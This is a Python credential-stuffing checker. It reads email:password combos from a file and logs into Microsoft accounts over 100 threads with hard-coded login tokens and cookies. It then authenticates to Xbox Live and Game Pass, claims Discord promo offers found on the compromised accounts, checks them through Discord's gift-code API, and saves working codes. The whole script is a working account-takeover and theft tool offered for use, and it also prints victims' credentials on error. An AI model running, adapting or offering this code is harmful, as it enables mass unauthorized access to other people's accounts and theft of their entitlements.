from curl_cffi import requests
from colorama import Fore, init
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import ctypes

init(autoreset=True)
print_lock = threading.Lock()
checked_accounts = 0
promos_found = 0
total_accounts = 0
stats_lock = threading.Lock()
save_lock = threading.Lock()

def update_titlebar():
    global checked_accounts, promos_found, total_accounts
    with stats_lock:
        checked = checked_accounts
        promos = promos_found
        total = total_accounts
    
    title = f"Accounts Checked: {checked}/{total} | Promos Found: {promos_found}"
    try:
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    except:
        pass
    print(f"\r{Fore.YELLOW}{title}", end="", flush=True)


DISCORD_TOKEN = "YOUR_DISCORD_TOKEN_HERE" #TOKEN HERE

MAX_THREADS = 100

def check_promo(promo_link):
    try:
        if not DISCORD_TOKEN:
            return None, "No Token Provided"
            
        code = promo_link.split("/")[-1]
        headers = {"Authorization": DISCORD_TOKEN}
        r = requests.get(f"https://discord.com/api/v9/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true", headers=headers)
        
        if r.status_code == 200:
            data = r.json()
            if data["uses"] >= data["max_uses"]:
                return None, "Max Uses Reached"
            if data["redeemed"]:
                return None, "Already Redeemed"
                
            return {
                "uses": data.get("uses"),
                "max_uses": data.get("max_uses"),
                "expires_at": data.get("expires_at")
            }, None
        elif r.status_code == 404:
            return None, "Invalid Code (404)"
        else:
            return None, f"Check Failed ({r.status_code})"
            
    except Exception as e:
        return None, f"Error: {str(e)}"
    return None, "Unknown Error"


def check(email, password):
    global promos_found
    retries = 0
    while True:
        if retries > 5:
            return False
        retries += 1
        try:
            session = requests.Session()
            step_retries = 0
            while True:
                if step_retries > 5:
                    return False
                step_retries += 1
                try:
                    tokenreq = session.post("https://login.live.com/ppsecure/post.srf?client_id=00000000402B5328&contextid=BDC5114DCDD66170&opid=24F67D97F397B4D4&bk=1766143321&uaid=b63537c0c7504c9994c9bb225f8b15b1&pid=15216&prompt=none",
                    data = {
                        "login": email,
                        "loginfmt": email,
                        "passwd": password,
                        "PPFT": "-DtA1pAkl0XJHNRkli!yvhp27QUgO13pUa3ZWnDBoHwyy!k9wWNwRWEyQYe!VK9zJcqrm8WWg7JoT30qyiKuxfftM*Nu6dE*e2km5kZLsSJhMmVmWWPE1KERSnnEcSLmF7fINHZ8RCZiQuA7svzQrpZ!cT0EXEdgCMzKKtGxHdEr2ASIuVp18K!PVtqs!!VJ2BHaCCoZmkDbbdM93QVJFUEqlZs5Irk1FrfHBmkOwc!oljXDF7s4yd0QLH6F8!OApew$$"
                    },
                    headers = {
                        "cookie": "MSPRequ=id=N&lt=1766143321&co=0; uaid=b63537c0c7504c9994c9bb225f8b15b1; OParams=11O.Dmr1Vzmgxhnw*DZMBommGzglE!XAx**dZAAEAkqrj6Vhfs1*d8zayvuFT4v8h**f4Zznq9nRUcLS9f73g52XDgo7Kbzaj6iKcOC5jd*0H*P0vHhUeQjflLTYuHZ5HjCH91cYf2IwyylYf1h*C0T0EAXHejOrafOi5c0OR9bDhZmwlD0LAij0Nh!LTG99GmPovt95zHocHGurn3MldqO7Wiu5sxHh72H0Lyq7fpM6jzizp7AunI36mEHFzldPpwHIiRIKpTu*ZLNOMdGWqc0eSTB8YMzPtg8dceV4x5n9Tg2EUB2Ys3Dy2Y0BTAddNnvHH4XHvg!FnkKhATiMub2jf8aakcAvExkfKMMWQuvAsS8shz0nD*eOvpilbh273y!r43VDwk5BEaKKmnZwjWFnKpWfx2wi1x3vfEtiU!EVKaGG; MSPOK=$uuid-643bb80a-c886-4f04-af49-4ab7b44ddc78$uuid-ee3b24c9-f289-4f10-aff1-7ff79eb97c11"
                    },
                    allow_redirects=False,
                    timeout=10
                    )
                    if tokenreq.status_code == 429:
                        continue
                    elif tokenreq.status_code != 302:
                        return False

                    if "token=" in tokenreq.headers["Location"]:
                        token = tokenreq.headers["Location"].split("token=")[1].split("&")[0]
                    else:
                        return False
                    break
                except (requests.errors.RequestsError):
                    continue
                except Exception as e:
                    continue

            if token != "None":
                step_retries = 0
                while True:
                    if step_retries > 5:
                        return False
                    step_retries += 1
                    try:
                        xbox_login = session.post(
                            'https://user.auth.xboxlive.com/user/authenticate',
                            json={
                                "Properties": {
                                    "AuthMethod": "RPS",
                                    "SiteName": "user.auth.xboxlive.com",
                                    "RpsTicket": token
                                },
                                "RelyingParty": "http://auth.xboxlive.com",
                                "TokenType": "JWT"
                            },
                            headers={
                                'Content-Type': 'application/json',
                                'Accept': 'application/json'
                            },
                            timeout=10
                        )
                        if xbox_login.status_code == 429:
                            continue
                        js = xbox_login.json()
                        xbox_token = js.get('Token')
                        if xbox_token != None:
                            uhs = js['DisplayClaims']['xui'][0]['uhs']
                            break
                        else:
                            return False
                    except (requests.errors.RequestsError):
                        continue
                    except Exception as e:
                        continue

                step_retries = 0
                while True:
                    if step_retries > 5:
                        return False
                    step_retries += 1
                    try:
                        xsts = session.post(
                            'https://xsts.auth.xboxlive.com/xsts/authorize',
                            json={
                                "Properties": {
                                    "SandboxId": "RETAIL",
                                    "UserTokens": [xbox_token]
                                },
                                "RelyingParty": "http://xboxlive.com",
                                "TokenType": "JWT"
                            },
                            headers={
                                'Content-Type': 'application/json',
                                'Accept': 'application/json'
                            },
                            timeout=10
                        )
                        if xsts.status_code == 429:
                            continue
                        elif xsts.status_code == 401:
                            return False
                        js = xsts.json()
                        xsts_token = js.get("Token")
                        authtoken = f"XBL3.0 x={uhs};{xsts_token}"
                        break
                    except (requests.errors.RequestsError):
                        continue
                    except Exception as e:
                        continue

                step_retries = 0
                while True:
                    if step_retries > 5:
                        return False
                    step_retries += 1
                    try:
                        r = session.get(
                            "https://profile.gamepass.com/v2/offers",
                            headers={"authorization": authtoken},
                            timeout = 10
                        )
                        if r.status_code == 200:
                            offers = r.json().get("offers", [])
                            promo_found_for_account = False
                            for offer in offers:
                                promo = None
                                if offer.get("offerStatus") == "available":
                                    try:
                                        pr = session.post(
                                            f"https://profile.gamepass.com/v2/offers/{offer.get('offerId')}",
                                            headers={"authorization": authtoken},
                                            timeout = 10
                                        )
                                        if pr.status_code == 200:
                                            promo = pr.json().get("resource")
                                    except Exception:
                                        pass
                                elif offer.get("offerStatus") == "claimed":
                                    promo = offer.get("resource")
                                
                                if promo and "discord" in promo.lower():
                                    with save_lock:
                                        promos_found += 1
                                        
                                        promo_data, error_msg = check_promo(promo)
                                        if promo_data:
                                            formatted_promo = f"{promo} | uses: {promo_data['uses']} | max uses: {promo_data['max_uses']} | expires at: {promo_data['expires_at']}"
                                            print(f"\n{Fore.CYAN}Found working promo: {formatted_promo}")
                                            open("promos.txt", "a").write(f"{formatted_promo}\n")
                                        else:
                                            print(f"\n{Fore.RED}Found promo ({error_msg}): {promo}")
                                    promo_found_for_account = True
                                    break
                            
                            if not promo_found_for_account:
                                return False
                        elif r.status_code in [401, 403]:
                            return False
                        else:
                            continue
                        break
                    except (requests.errors.RequestsError):
                        continue
                    except Exception as e:
                        print(e)
                        continue
                update_titlebar()
    
            else:
                break     
        except Exception as e:
            if "timeout" not in str(e).lower():
                with print_lock:
                    print(f"\n{Fore.RED}Error: {e} {email}:{password}")
            continue

with open("accs.txt", "r", encoding="utf-8", errors="ignore") as f:
    accounts = f.readlines()

valid_accounts = []
for acc in accounts:
    try:
        email, password = acc.strip().split(":")
        valid_accounts.append((email, password))
    except Exception:
        pass

with stats_lock:
    total_accounts = len(valid_accounts)

def submit_check(email, password):
    result = check(email, password)
    with stats_lock:
        global checked_accounts
        checked_accounts += 1
    update_titlebar()
    return result

print(f"{Fore.CYAN}Starting checker with {total_accounts} accounts...")
update_titlebar()

try:
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for email, password in valid_accounts:
            future = executor.submit(submit_check, email, password)
            futures.append(future)

        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                pass
    print(f"\n{Fore.GREEN}Finished checking all accounts.")
except KeyboardInterrupt:
    import os
    print(f"\n{Fore.RED}Program interrupted by user. Exiting...")
    os._exit(0)
